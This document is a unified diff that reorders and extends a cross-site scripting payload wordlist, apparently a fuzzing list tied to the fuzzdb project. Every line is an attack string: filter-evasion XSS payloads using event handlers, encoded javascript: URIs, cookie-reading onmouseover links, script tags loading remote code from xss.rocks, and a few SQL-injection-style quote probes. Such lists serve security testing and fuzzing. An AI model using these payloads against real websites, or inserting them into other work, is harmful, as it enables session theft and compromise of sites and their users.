@@ -1,42 +1,57 @@
-<~/XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
-http://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/attack/xss/test.xxe
-https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/attack/xss/test.xxe
-&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi
-&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>
-PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
-&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;
-javascript:alert(1)
-alert(1)
-alert
+'
+ <font style='color:expression(alert('XSS'))'>
+' or 2=2
+"
+" or 202
+";eval(unescape(location))//#  %0Aalert(0)
+"><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
 &#x61;l&#x65;rt&#40;1)
-alert&lpar;1&rpar;
-alert`1`
-alert\\`1\\`
+&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>
+&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi
+&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;
 &lt;IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;
+&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;
+&lt;SCRIPT SRC=//xss.rocks/.j>
+'); alert('XSS
+\";alert('XSS');//
+<~/XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
+<<SCRIPT>alert("XSS");//<</SCRIPT>
 <a onmouseover="alert(document.cookie)">xxs link</a>
 <a onmouseover=alert(document.cookie)>xxs link</a>
-<IMG SRC="jav&amp;#x0D;ascript:alert('XSS');">
-<IMG SRC= onmouseover="alert('xxs')">
+<BASE HREF="javascript:alert('XSS');//">
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+<body onLoad="alert('XSS');"
+<body onunload="javascript:alert('XSS');">
+<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>
+<iframe src=http://xss.rocks/scriptlet.html <
+<IMG DYNSRC=\"javascript:alert('XSS')\">
 <IMG onmouseover="alert('xxs')">
-<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
-&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;
-&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;
-<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
-<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+<IMG SRC= onmouseover="alert('xxs')">
+<IMG SRC=" &#14;  javascript:alert('XSS');">
 <IMG SRC="jav&#x09;ascript:alert('XSS');">
 <IMG SRC="jav&amp;#x09;ascript:alert('XSS');">
 <IMG SRC="jav&amp;#x0A;ascript:alert('XSS');">
-<IMG SRC=java%00script:alert(\"XSS\")>
-<IMG SRC=" &#14;  javascript:alert('XSS');">
-<SCRIPT\s" != "<SCRIPT/XSS\s';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
-<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
-<SCRIPT/SRC="http:&#47;&#47;xss.rocks/xss.js"></SCRIPT>
-<<SCRIPT>alert("XSS");//<</SCRIPT>
-<SCRIPT SRC=http://xss.rocks/xss.js?< B >
-&lt;SCRIPT SRC=//xss.rocks/.j>
+<IMG SRC="jav&amp;#x0D;ascript:alert('XSS');">
 <IMG SRC="javascript:alert('XSS')"
-<iframe src=http://xss.rocks/scriptlet.html <
-\";alert('XSS');//
+<img src="javascript:alert('XSS')">
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+<IMG SRC=java%00script:alert(\"XSS\")>
+<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
+<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
 <SCRIPT SRC="http:&#47;&#47;xss.rocks/xss.jpg"></SCRIPT>
+<SCRIPT SRC=http://xss.rocks/xss.js?< B >
+<SCRIPT/SRC="http:&#47;&#47;xss.rocks/xss.js"></SCRIPT>
+<SCRIPT\s" != "<SCRIPT/XSS\s';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+<script>alert('XSS');</script>
+alert
+alert&lpar;1&rpar;
+alert(1)
+alert\\`1\\`
+alert`1`
+http://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/attack/xss/test.xxe
+https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/attack/xss/test.xxe
 javascript:alert%28/xss/%29
-";eval(unescape(location))//#  %0Aalert(0) 
+javascript:alert(1)
+PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
